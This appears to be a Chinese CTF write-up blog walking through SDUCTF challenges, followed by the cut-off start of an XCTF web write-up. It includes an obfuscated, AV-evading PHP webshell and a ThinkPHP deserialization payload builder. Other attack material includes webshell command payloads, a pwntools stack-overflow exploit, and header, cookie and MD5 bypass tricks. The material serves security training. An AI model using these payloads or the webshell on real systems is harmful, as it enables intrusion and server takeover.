得到如上页面，访问url/f1ag_1s_h3re.php，得到flag 0x0f 你的IP不太对 题目描述：小伙计，你的IP不太对啊这个网站可不是任何ip都能访问的 由题目可知，需要改ip成111.111.111.111访问，易知是XFF伪造 利用burpsuite抓包，在header里加上X-Forwarded-For:111.111.111.111即可，发送包，得到flag 0x10 登录 题目描述： 小王做了一个网站需要登录，但是验证貌似有点漏洞 进入页面之后发现button是没有用的，F5刷新之后抓包，发现有一个cookie 尝试将Cookie改成Cookie: Login=1，发现成功得到flag在button上 0x11 破解md5 题目描述： md5是坚不可破的，是真的吗？ 进入页面之后直接查看源码，如题直接百度搜索php MD5漏洞。 引自： https://blog.csdn.net/qq_19980431/article/details/83018232 123456789&lt;!-- if (isset($_GET['a']) and isset($_GET['b'])) &#123; if ($_GET['a'] != $_GET['b']) if (md5($_GET['a']) == md5($_GET['b'])) die('Flag: '.$flag); else print 'Wrong.';&#125; --&gt; 若要求满足上述条件则那么要求name和password数值不同但是MD5相同，在这里可以利用绕过。PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么PHP将会认为他们相同，都是0。 以下值在md5加密后以0E开头： QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a 以下值在sha1加密后以0E开头： sha1(‘aaroZmOk’) sha1(‘aaK1STfY’) sha1(‘aaO8zKZF’) sha1(‘aa3OFF9m’) 直接传入url/?a=QNKCDZO&amp;b=240610708，得到flag 0x12 php是最好的语言 题目描述： php是最好的语言? 进入页面如上图，点击查看source.php 1234567891011&lt;?php if ($_SERVER["REQUEST_METHOD"] == "POST") &#123; $flag="flag&#123;this_is_flag&#125;"; $pass=""; $thepassword_123="不告诉你"; extract($_POST);&#125;?&gt;&lt;div&gt; &lt;p&gt;&lt;?php if ($pass == $thepassword_123) &#123; echo $flag;&#125; else &#123;echo "ha,你永远猜不到";&#125; ?&gt;&lt;/p&gt;&lt;/div&gt; 得到php源码，百度php extract函数，得知extract()有个变量覆盖漏洞 由php源码得知所有变量名，直接出入post参数pass=&amp;thepassword_123= 得到flag 0x13 一句话木马2 题目描述： 在现实世界中，最原始的一句话木马往往会被waf给拦截，所以在使用过程中一般会进行编码或者加密。这里使用最简单的编码，你能成功利用这个后门吗？ 进入网页查看源码 百度得知waf是Web Application Firewall的简称。 这题应该是要绕过waf，进行获取webshell 由&lt;!--php @eval(@base64_decode($_POST[&quot;cmd&quot;])); --&gt;和题目shell.php得知：实在shell.php执行一句话木马 12345system('ls');base64&gt;&gt;&gt;c3lzdGVtKCdscycpOw==system('cat ffffllllaaaagggg')base64&gt;&gt;&gt;c3lzdGVtKCdjYXQgZmZmZmxsbGxhYWFhZ2dnZycpOw== 注：别在网页中解base64，不同网页也许会将字符串先url编码或者Unicode编码在进行base64加密，直接用burpsuite带的base64encode，然后发包即可 得知flag在同目录下的ffffllllaaaagggg里 得到flag 0x14 拼手速 题目描述： 你就是个没有感情的浏览器，但是你的手速够快吗？ 进入页面 如题，提交get请求url/?first=cyber 如题，提交post请求sceond=ans（因为计算式每次都会变，所以我这用ans替代，不过也没关系，得到如下页面 因为每次刷新get页面是计算式都会变，所以我想到了用python的requests的库，脚本如下 123456789101112131415161718192021222324252627282930313233import requestsimport reurl = "http://url/?first=cyber"reflag = '\d\*\d\+\d\*\d'def qa():4r1 = requests.get(url)4print(r1.text)4r2 = re.search(reflag,r1.text)4print(r2.group())4ans = eval(r2.group())4print(ans)4ck = str(r1.cookies)4pd = re.search('PHPSESSID=.* for',ck)4pd = pd.group().split(' for')[0]4print(pd)4header = &#123;4"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0",4"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",4"Cookie":pd,4"Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",4"Accept-Encoding": "gzip, deflate"4&#125;4data = &#123;"second":ans&#125;4print(header)4r4 =requests.post(url,headers=header,data=data)4print(r4)4print(r4.text)#flag4return r44aa = qa()#print(aa) 跑出来结果如下，得到flag 0x15 信息泄露 题目描述： 信息泄露了，快拿到它 猜是php+Git泄露，参考如下文章，访问http://url/.git/HEAD，果然下载了HEAD文件 文件里写着：ref: refs/heads/master，按如下文章提取了访问url/refs/heads/master，提取了master里的文件：985e6ce910e4cffa9957cf88fd9ac28c13654d6c https://www.jianshu.com/p/0ea09975169d https://www.cnblogs.com/xhds/p/10884647.html 然后发现GitHack一波就得到flag了emmmmmmmm 0x16 web图床 题目描述： 图床开发中，先放出来给你们玩一下 进入发现是一个登陆网页，想要注入却是登陆失败，那就注册一个试试 注册后登陆进去，是一个可以上传图片的网页，其他啥东西也没有，推测是用图片做一句话木马 1copy a.png/b+1.php t.png 但是发现上传上去之后返回的是就是图片，改后缀也无法访问其php文件 于是尝试了各种图片一句话木马的可能，比如截断，抓包改后缀，发现服务器只接受图片文件，而且无论是什么格式的图片会被改成png格式进行呈现，而且不能上传其他格式的文件。 其中中间网页貌似崩了一下，看到是ThinkPHP V5.1 ，百度搜其漏洞，发现也没法实现 其展示的后面解md5得到是172.2.0.2，想着内网地址也没得访问，后面跟着也是文件的MD5值12Index of /upload/fd40c7f4125a9b9ff1a4e75d293e3080/MD5(172.2.0.2) = fd40c7f4125a9b9ff1a4e75d293e3080 抓包看Cookie解析之后，想改Cookie其中的文件后缀也没用。 后面实在没思路了，就打算对网站进行一波路径扫描，结果发现了惊喜，有一个www.tar.gz，访问下载文件，发现就是php源码了。 不过我还没到能完全审计php源码的高度，我就将其中一部分的源码取用百度搜索，果然搜到了原题 https://www.freebuf.com/column/205789.html https://blog.csdn.net/qq_26406447/article/details/90671853 https://www.zhaoj.in/read-5873.html 通过PHP反序列化，得到cookie去使文件转化时，解析成php。 php发序列号程序如下，用生成的结果替换已有的Cookie即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?phpnamespace app\web\controller;class Profile&#123; public $checker; public $filename_tmp; public $filename; public $upload_menu; public $ext; public $img; public $except; public function __get($name) &#123; return $this-&gt;except[$name]; &#125; public function __call($name, $arguments) &#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125; &#125;&#125;class Register&#123; public $checker; public $registed; public function __destruct() &#123; if(!$this-&gt;registed)&#123; $this-&gt;checker-&gt;index(); &#125; &#125;&#125;$profile = new Profile();$profile-&gt;except = ['index' =&gt; 'img'];$profile-&gt;img = "upload_img";$profile-&gt;ext = "png";$profile-&gt;filename_tmp = "../public/upload/md5(user)/md5(filename).png";$profile-&gt;filename = "../public/upload/md5(user)/xxx.php";$register = new Register();$register-&gt;registed = false;$register-&gt;checker = $profile;echo urlencode(base64_encode(serialize($register))); 不过复现时也遇到了不少麻烦，通过以下代码构造payload然后去替代我们的Cookie，刷新后得到我们修改后缀的php图片马。 不过在用户已登录时改Cookie时没用，要等到退出账户到登陆界面时设置新建Cookie，再刷新得到如下界面说明成功了 此时，去访问url/upload/即可看到我们修改的php后缀的文件，同时在上传做php图片马时也遇到了问题 以下是中国蚁剑生成的免杀马，和png图片拼接在一起上传后发现无法解析 1234567891011121314151617181920&lt;?php class ISGM &#123; function MaRC() &#123; $XYUg = "\xf9" ^ "\x98"; $LaqL = "\x57" ^ "\x24"; $LXlg = "\xe0" ^ "\x93"; $kYoS = "\x7a" ^ "\x1f"; $zzTF = "\xaf" ^ "\xdd"; $hteZ = "\x9f" ^ "\xeb"; $DBlL =$XYUg.$LaqL.$LXlg.$kYoS.$zzTF.$hteZ; return $DBlL; &#125; function __destruct()&#123; $LlRV=$this-&gt;MaRC(); @$LlRV($this-&gt;So); &#125;&#125;$isgm = new ISGM();@$isgm-&gt;So = isset($_GET['id'])?base64_decode($_POST['pass']):$_POST['pass'];?&gt; 然后尝试自己写了一个，拼接在一起也没有躲开这个错误的厄运 查看图片马的源码发现如下： 可能是png文件尾和php头部拼接，导致一些转义问题，php失去头部&lt;?php导致解析php解析失败 然后尝试用jpg文件去做一个图片马、上传，果然成功了 然后用中国蚁剑连上服务器，在根目录下找到flag Misc0x01 Gif 题目描述： Gif你眼神够快吗？ 用StegSolve.jar 打开目标gif，即可逐帧查看，一共六帧，4帧都是flag需要自己拼接。 拼接完得到flagSDUCTF{Gif_is_very_interesting} 0x02 PDF 题目描述： pdf里面藏了啥？ 跟攻防世界的一题misc一样，随便找个网站将pdf转doc，然后把图片拖开flag就藏在下面。 或者用一些pdf编辑器也做的到。 0x03 今晚月色美吗 题目描述： 小王同学在路上走路，突然发现小朱同学发了一条朋友圈，配图是美美的月亮。于是小王同学心血来潮，掏出手机也拍了一张照片。你觉得月亮有什么奇怪的地方吗？ 用StegSolve查看，原以为是加密，，没想到是藏在不同色差层。 0x04 聋子听声音 题目描述： 我这边用的是Audacity，据说AU也可以查看，根据题目描述，音频应该不是隐写，而是藏在频谱图里 查看频谱图就可得flag 0x05 二进制 题目描述：看二进制你能看出个什么花样来？ 原本没有思路的，将文件扔进binwalk和foremost跑没跑出东西，用less，more没跑出来，最后自暴自弃用cat一试，flag就出来了，我还以为有什么隐写emmmmmmmmmm 结果是一堆0加上flag 另一种办法，用010editor打开，直接搜索flag，得到flag 0x06 奇怪的压缩文件 题目描述： eva说她给tom发了一张二维码，但是Tom接收文件后觉得不太对劲。 打开附件PIC.zip，发现里面有四个压缩文件，发现解压不了。扔binwalk跑一波发现是jpeg，直接改后缀得到jpg图片。 四个压缩文件分别是QRcode四等分，用画图把他们拼一起，获得一张完整的二维码，扫码得到flag。 0x07 zip 题目描述： 这是一个加密的压缩包，你能打开它吗？ 发现没有截图，就说下思路把，转手就去把图截了，显示一个password.zip伪加密，用ZipCenOp解开伪加密，看到里面还有一个压缩包 但是压缩包里面是一个图片文件，写着flag不在这 于是就把里面那个zip拖进010editor查看，发现是隐写一个压缩包，直接看到flag，复制提交就完了 0x08 猜拳 题目描述： 猜拳，你能赢过机器人吗？ 又是没有思路的pwn，上网搜索得知python有个pwn库可以计算随机数种子，既然是猜，我就自己找一波规律。 12robot: bsj sjb jbsI can win: jbs bsj sjb 找规律得知对面出拳是一个循环，自己手动解一波得到flag (竟然改成Misc了，果然不是一道pwn题) PWN0x01 Simple nc 题目描述： 你会使用nc命令吗? 可能是全球最简单的pwn题目 虽然pwn还没入门，不过这确实是最简单得pwn。 熟悉nc即netcat命令即可，netcat ctf.sec.sdunet.cn 38849直接连上通过ls,cat命令读取flag 0x02 StackOverflow 题目描述： 作为程序员怎么会不知道 https://stackoverflow.com/ 一道基本的栈溢出题目，但是中间的编码问题令人烦躁 用IDA逆向，看到主函数。 进入hello()函数可以看到如下：其中有get函数 根据ctf-wiki的pwn的基本教程的get栈溢出就可以做出来 还在其中找到success，这应该就是我们getshell的函数 根据ctf-wiki构造exp 1234567891011from pwn import *sh = remote("ctf.sec.sdunet.cn","38268")#sh = process(./stackoverflow)success_addr=0x08048486#payload = 'a' * 0x14 + 'bbbb' + p32(success_addr)payload = 'a' * 0x14 + 'bbbb' + '\x86\x84\x04\x08'print(p32(success_addr)#out&gt;&gt;&gt;b'\x86\x84\x04\x08'sh.sendline(payload)sh.interactive() 用pwntools直接构造exp，getshell，获得flag 其中遇到了一个编码问题： 因为地址用p32转成地址形式为b&#39;\x86\x84\x04\x08所以一直编码不成功，导致payload连接失败不能成功getshell 在decode时使用&#39;ignore&#39;模式，\x86\x84两个字符会被忽略，说明是非法字符。 不懂是啥错误！！ pwn自带的flat方法可以拼接字符串避开str连接的错误，flat方法传入一个列表list[]，list里放所需要拼接的对象 ： payload = flat([&#39;a&#39;*24,&#39;bbbb&#39;,addr]) 还有执行elf文件，由于我的系统是64bitUbuntu，执行32bitELF文件需要安装以下包 1sudo apt install lib32ncurses5 lib32z1 Crypto0x01 Base 题目描述：[https://baike.baidu.com/item/贝斯/] 奇怪的链接 题目直接给了两个链接，不过第二个如下 1ZmxhZ3tiYXNlNjRfaXNfbm90X2FuX2VuY3J5cHRpb25fbWV0aG9kfQ 直接扔base64去解码，得到flag：flag{base64_is_not_an_encryption_method} 0x02 诡异的数字 题目描述：摩同学做ctf到深夜，点开这道题却发现网安实验室里的灯突然有规律的时暗时亮，十分诡异。难道这代表着什么？他用颤抖的双手记下了下面这段文字。你能发现其中的奥秘吗？11 111 010 000 0 11111 00 000 1111100 10 1 0 010 0 000 1 00 10 110 flag格式为sductf{xxxxxxxxxx} 既然是摩同学，那么直接放莫斯解码即可，字符串利用python脚本的str.replae()方法替换成.-即可，即1对应-，2对应.，解得flag。 0x03 九宫格 题目描述：无论是搜狗输入法还是百度输入法还是QQ输入法还是讯飞输入法还是谷歌输入法还是……….都有9宫格，所以这个题目炒鸡简单 7426366432983解出来的明文赋值给x flag为 flag{ md5(x+md5(x,16), 32) }(结果没有空格，x+ 表示的是x与另一个字符串进行拼接） 一串数字通过经典的九宫格打出来是山东大学四个字 然后通过python的hashlib.md5()就可以算出flag md5的16位百度得知是截取32位md5中间的16位 1234import hashlibs = "山东大学"mobj = hashlib.md5(s.encode('utf-8')).hexdigest()[8:24]ans = hashlib.md5(str(s+mobj).encode('utf-8')).hexdigest() 12345678&gt;&gt;&gt; import hashlib&gt;&gt;&gt; s = "山东大学"&gt;&gt;&gt; mobj = hashlib.md5(s.encode('utf-8')).hexdigest()[8:24]&gt;&gt;&gt; mobj'f09383b061bb3c9f'&gt;&gt;&gt; ans = hashlib.md5(str(s+mobj).encode('utf-8')).hexdigest()&gt;&gt;&gt; ans'ecf506190946c4e8d06d53e14191329e' 0x04 键盘追踪 题目描述：键盘是个画板，如果你的键盘有灯光应该会简单点 rfsdsz tfvbhy ijnm ijnm tfvbhy wsxdcft vgyhujm hjuygbn 还原出明文后请自行拼接flag{} 之前在成都大学的ctf比赛中看过键盘密码，看题目描述应该是按键盘位置画出字母来，但是我比划出olloWMe后七个字母，硬是没看懂第一个字符是啥，然后将那些字符扔去百度，搜索得到的时FollowMe，尝试一波，果然是flag。 （至今为止我都不知道第一个为啥时F 0x05 宇宙终极问题 题目描述：Do you know The Answer to the Ultimate Question of Life, The Universe, and Everything? Give me 3 integers, x, y, and z, such that x^3 + y^3 + z^3 = 42 得到x、y、z后请把它们乘起来，然后包裹上flag{} 直接百度得到解如下，扔进python跑一波大数乘法 1234567&gt;&gt;&gt; x = -80538738812075974&gt;&gt;&gt; y = 80435758145817515&gt;&gt;&gt; z = 12602123297335631&gt;&gt;&gt; x**3+y**3+z**342&gt;&gt;&gt; x*y*z-81639006040518590050493906720365515701570561538910 0x06 秘密报文 题目描述：在第一次世界大战期间，法国陆军捕获到一份秘密报文，交给中尉Georges Painvin尝试破解。 报文内容如下：XX DF GG AF XD XF AF XD XF AF AG DD AF GF DX XF XD 解密之后请自行拼接flag{}提交 我记得之前做题时有看见过类似密码，但是忘了是啥。 最明显的，先把中尉名字Georges Painvin百度一波，得知时ADFGVX密码对照密码表，解得flag：flag{youarearealhacker} 0x07 ok? 题目描述： 就问你ok不ok Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. 既然是密码题，那就百度呗 搜索的是ok密码，文章和转换的github地址如下 https://www.splitbrain.org/services/ook https://github.com/splitbrain/ook 不过有点不对，观察样例密码，把#换成?，解得flag 0x08 什么密码？ 题目描述： EVA给Tom发了一封邮件，但是Tom却看不懂EVA想表达什么，请你向Tom解释一下这封邮件 发件人：EVA收件人：TomPxevhfxmhietrpbmamablztfx flag格式：sductf{+.} The answer is related to my favorite movie. 密码可能做着做着心态崩了，不小心把Crypto当misc做了 把图片下下来，没注意到图片上到Cesar，binwalk跑一波图片，发下里面还有一个zlib，百度解zlib，然后疯狂报错，贼难受，然后看了hint，得知凯撒密码 难受 -600point 位移几位忘了。 And 十分真实，都把顺序放我TODO List下了，妈耶 什么密码？https://blog.csdn.net/qq_40574571/article/details/80164981 0x09 Mix 题目描述：解开她，flag就是你的了 JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzY7JiN4MzM7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzE7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzY7JiN4MzI7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzY7JiN4MzQ7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4Mzk7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4Mzg7JiN4MjU7JiN4MzM7JiN4MzU7JiN4MjU7JiN4MzY7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzY7JiN4MzQ7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4Mzk7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4Mzg7JiN4MjU7JiN4MzM7JiN4MzU7JiN4MjU7JiN4MzY7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzM7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4MzI7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4Mzk7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4MzA7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4MzQ7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzY7JiN4MzY7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzY7JiN4MzQ7 一看这种就是混合密码，靠直觉先解一波base64，然后发下可以解下去，发一波解密顺序，忘记录flag了。 1（base64-&gt;unicode-&gt;转中文（utf-8)-&gt;urldecode-&gt;hex decode） Mobile0x01 apk1 题目描述：用着安卓手机，你懂apk吗？ 通过工具d2j-dex2jar和jd-gui两者逆向apk得到flag 0x02 apk2 题目描述： 你真的懂apk吗？ 通过工具d2j-dex2jar和jd-gui两者逆向apk得到flag 然后看代码可知是对字符串进行一个排序，将字符串里的第i位放到s2[i]位，得到结果 直接写一个python脚本得到flag 0x03 apk3 题目描述：再来一发，听说过Kotlin吗？ 下下来解压按套路拖给d2j-dex2jar然后发现有两个.dex后缀的文件，逆向报错 于是现去网上下了一个jeb逆向，然后找一个样例现学jeb 直觉看这个字符串有用，然后在下面果然发现 play函数就是对这个字符串进行比对，就是将字符串的偶数位的ascii值减2，得到新串与该字符串进行比较 写个python脚本逆着加回去可得flag apk3：sductf{Easy_Apk_1s_n0t_hard_4_U!} 1234567891011&gt;&gt;&gt;f'a2P1W3Pmc0Tha3jfOX@rVzDzV22wbF7oWXHkVzPfTSD9'&gt;&gt;&gt; for i in f:... if cnt%2 == 0:... s += chr(ord(i)+2)... else:... s+=i... cnt += 1...&gt;&gt;&gt; s'c2R1Y3Rme0Vhc3lfQXBrXzFzX24wdF9oYXJkXzRfVSF9' 0x04 FuckAPP 题目描述： 你真的懂apk吗？ 常规，拖进jeb看main函数，发现只有一些setViewID之类的函数并没有主要的逻辑，于是回去将apk解压缩 发现包里和以前的apk解压不同，apk3是多了一个Kotlin文件夹，而这个fuck app 是多了一个lib文件夹，猜主要的函数在里面，打开lib/arm64-v8a得到一个libnative-lib.so，拖进IDA里进行逆向 暴力搜一波果然看到了flag，直接得到flag，还以为要看函数逻辑。 Reverse0x01 Java jar 题目描述： 都是java程序员，互相偷个代码谁不会呀！ 下载附件得到jar包，直接解压得到文件，打开main.class，看到flag明文就在main.class里 0x02 C 题目描述： C#简直跟java一样，会java就自然上手c#了。 下载附件得到sductf.exe，拖入辣个女人ida进行逆向，直接得到flag 0x03 Rust 题目描述： 你听说过Rust语言吗？ 据说它非常安全。 没接触过rust语言，不过据说逆向不知道程序逆向结构时，最好自己写个程序HelloWorld进行逆向一波看结构，但是我偷懒了。 直接百度搜索：rust逆向 https://www.anquanke.com/post/id/169970 https://blog.csdn.net/qq_33438733/article/details/81138573 看完链接之后打开ida，还需要64bit的辣个女人。 乱逛发现有一个字符串，但是解码出来是一个奇怪的东西，继续找主函数main 主函数入口 点进第一个函数查看流程 既然是逆向，那就从尾部往后面看，果然看到一个判断和一个类似flag的字符串c2R1Y3Rme0lfbDB2ZV9ydXN0X2hoaGh9，base64解码得到flag：sductf{I_l0ve_rust_hhhh} 0x04 EasyCrackMe 题目描述：无 下下来是一个exe文件，用010editor打开，发现说是PE文件，而且也发现是PE文件头，于是拖进去IDA逆向。 逆向main函数无思路，便开TextView查看，看到如下图黄色字符串感觉很奇怪，而且下面有一个Congratulations！，猜测这段字符串是flag F5进入查看具体函数，大概是对输入字符串的每一位与0x16进行异或得到v5字符串 于是用python逆函数一波，果然得到flag 在后面写wp时，完善了思路。 因为进去运行提示输入一个key，然后就在IDA的TextView搜索key，得到第一张图的函数入口，接下来看逻辑即可。]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XCTF-adworld-web-wp]]></title>
    <url>%2F2019%2F11%2F11%2FXCTF-adworld-web-wp%2F</url>
    <content type="text"><![CDATA[Web&amp;WriteUpWeb如同一座正三角冰山，等着去探索。。。 攻防世界&amp;Web新手练习区0x01 view_source 题目描述：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。 利用view-source://url或者f12或者右键查看源码，flag就在源码里 0x02 get_post 题目描述：X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？ 利用burp suite 发包得到flag 另一种思路是利用python的requests库发送请求。 0x03 robots 题目描述：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。 查看源码肯定是没有flag的，根据题目robots可联想到web的robots.txt协议 robots.txt协议是在Web站点的根目录下设置一个robots.txt文件，规定站点上的哪些区域或者哪些页面是限制搜索的。搜索程序将参考该文件，决定站点中的哪些区域是不允许搜索的，并在接下来的搜索过程中跳过这些区域。 下面是一个例子： 123456&gt; #robots.txt for http://somehost.com&gt; &gt;User-agent: *&gt; Disallow: /cgi-bin&gt; Disallow: /registration&gt; 示例中第一行是一行注释，注释以一个#开头。 User-agent：指访问站点的程序，每个浏览器都有一个唯一的User-agent值，浏览器在向Web服务器发送请求时会在每个请求中都附加这个值。Web站点通过在robots.txt中使用User-agent就可以针对不同的User-agent设置不同的规则。 Disallow是拒绝语句，定义了搜索程序不允许访问的Web站点路径。拒绝语句只针对路径进行设置，不针对具体的文件。 直接访问http://xxx.xxx.xxx.xxx/robots.txt 得到一个php路径，直接访问得到flag 0x04 backup 题目描述：X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！ php的备份有两种：.php~和.php.bak 如果网站存在备份文件，在地址栏最末加上/index.php~或/index.php.bak，即可得到备份文件 index.php.bak 访问 http://url/index.php.bak 即自动下载了index.php.bak，打开查看flag就在里面 0x05 cookie 题目描述：X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？’ chrome在console中输入命令javascript:alert(document.cookie) 其实在地址栏输入也可以实现 弹出 look-here=cookie.php 访问url/cookie.php看到See the http response 打开F12开发者模式的Network，查看cookie.php的回应，Response里没找到flag，最后在Response Headers里找到flag 0x06 disabled button 题目描述：X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？ 明显是一个灰色的按钮，查看源码有&lt;button disabled&gt;跟hackergame2019的签到题一样，把disabled删掉点击按钮即可。 0x07 simple_js 题目描述：小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} ) 先输入任意字符进入页面查看源码 12345678910111213141516171819202122&lt;script&gt; function dechiffre(pass_enc)&#123; var pass = "70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65"; var tab = pass_enc.split(','); var tab2 = pass.split(',');var i,j,k,l=0,m,n,o,p = "";i = 0;j = tab.length; k = j + (l) + (n=0); n = tab2.length; for(i = (o=0); i &lt; (k = j = n); i++ )&#123;o = tab[i-l];p += String.fromCharCode((o = tab2[i])); if(i == 5)break;&#125; for(i = (o=0); i &lt; (k = j = n); i++ )&#123; o = tab[i-l]; if(i &gt; 5 &amp;&amp; i 